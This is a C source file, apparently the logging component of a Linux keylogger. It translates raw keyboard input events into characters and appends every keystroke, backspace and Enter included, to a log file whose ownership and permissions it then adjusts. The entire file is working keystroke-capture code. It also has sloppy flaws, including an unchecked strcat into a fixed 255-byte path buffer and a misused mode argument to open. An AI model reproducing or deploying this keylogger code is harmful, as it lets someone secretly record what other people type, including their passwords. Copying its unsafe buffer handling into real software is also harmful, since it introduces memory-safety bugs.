#include <errno.h>
#include <fcntl.h>      /* for open */
#include <stdlib.h>     /* for malloc */
#include <string.h>     /* for strerror */
#include <sys/stat.h>   /* for mode */
#include <unistd.h>     /* for getcwd */

#include "common.h"
#include "keylog.h"
#include "logger.h"

#define BUFFSIZE 255

struct priv {
    bool append;
    int logfd; /* file descriptor */
    mode_t logmode;
    char logname[KEY_LOG_LEN];
};

static int keylog_open(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    int oflag;
    char path[BUFFSIZE];
    struct stat stat_cwd;

    /* open for writing only, create file if doesn't exist */
    oflag = (O_WRONLY | O_CREAT);

    if (priv->append) {
        oflag |= O_APPEND;
    } else {
        /* Truncate the file to 0 */
        oflag |= O_TRUNC;
    }

    getcwd(path, BUFFSIZE);

    /* collect information about the current directory */
    stat(path, &stat_cwd);

    strcat(path, "/");
    strcat(path, priv->logname);
    logger.info("Log file: %s", path);

    priv->logfd = open(path, oflag, O_WRONLY);

    /* Set the owner to match that of the directory that it's run under */
    fchown(priv->logfd, stat_cwd.st_uid, stat_cwd.st_gid);
    fchmod(priv->logfd, priv->logmode);

    return OK;
}

static int keylog_close(keylog_t *kl)
{
    struct priv *priv = (struct priv *) kl->priv;

    if (close(priv->logfd) == ERROR) {
        logger.error("Closing %s failed: %s",
                     priv->logname, strerror(errno));
        return ERROR;
    }

    return OK;
}

static void keylog_log(keylog_t *kl, struct input_event e)
{
    struct priv *priv = (struct priv *) kl->priv;

    char c;
    unsigned short code = e.code;

    switch (code) {
    case KEY_1: c = '1'; break;
    case KEY_2: c = '2'; break;
    case KEY_3: c = '3'; break;
    case KEY_4: c = '4'; break;
    case KEY_5: c = '5'; break;
    case KEY_6: c = '6'; break;
    case KEY_7: c = '7'; break;
    case KEY_8: c = '8'; break;
    case KEY_9: c = '9'; break;
    case KEY_0: c = '0'; break;

    case KEY_A: c = 'a'; break;
    case KEY_B: c = 'b'; break;
    case KEY_C: c = 'c'; break;
    case KEY_D: c = 'd'; break;
    case KEY_E: c = 'e'; break;
    case KEY_F: c = 'f'; break;
    case KEY_G: c = 'g'; break;
    case KEY_H: c = 'h'; break;
    case KEY_I: c = 'i'; break;
    case KEY_J: c = 'j'; break;
    case KEY_K: c = 'k'; break;
    case KEY_L: c = 'l'; break;
    case KEY_M: c = 'm'; break;
    case KEY_N: c = 'n'; break;
    case KEY_O: c = 'o'; break;
    case KEY_P: c = 'p'; break;
    case KEY_Q: c = 'q'; break;
    case KEY_R: c = 'r'; break;
    case KEY_S: c = 's'; break;
    case KEY_T: c = 't'; break;
    case KEY_U: c = 'u'; break;
    case KEY_V: c = 'v'; break;
    case KEY_W: c = 'w'; break;
    case KEY_X: c = 'x'; break;
    case KEY_Y: c = 'y'; break;
    case KEY_Z: c = 'z'; break;

    case KEY_COMMA: c = ','; break;
    case KEY_SEMICOLON: c = ';'; break;
    case KEY_APOSTROPHE: c = '\''; break;
    case KEY_DOT: c = '.'; break;
    case KEY_SLASH: c = '/'; break;
    case KEY_BACKSLASH: c = '\\'; break;
    case KEY_BACKSPACE: c = '<'; break;

    case KEY_MINUS: c = '-'; break;
    case KEY_EQUAL: c = '='; break;
    case KEY_GRAVE: c = '~'; break;

    case KEY_ENTER: c = '\n'; break;
    case KEY_TAB: c = '\t'; break;
    case KEY_SPACE: c = ' '; break;

    default: c = '\0'; break;
    }

    write(priv->logfd, &c, 1);
}

keylog_t *create_keylog(const cmd_args_t cmd_args)
{
    keylog_t *kl;
    struct priv *priv;

    kl = (keylog_t *) malloc(sizeof(keylog_t));
    priv = (struct priv *) malloc(sizeof(struct priv));

    kl->open = keylog_open;
    kl->close = keylog_close;
    kl->log = keylog_log;

    priv->append = cmd_args.append_keylog;
    priv->logmode = cmd_args.keylog_mode;
    strncpy(priv->logname, cmd_args.keylog_filename, KEY_LOG_LEN);

    kl->priv = (void *) priv;

    return kl;
}

void destroy_keylog(keylog_t *kl)
{
    free(kl);
}
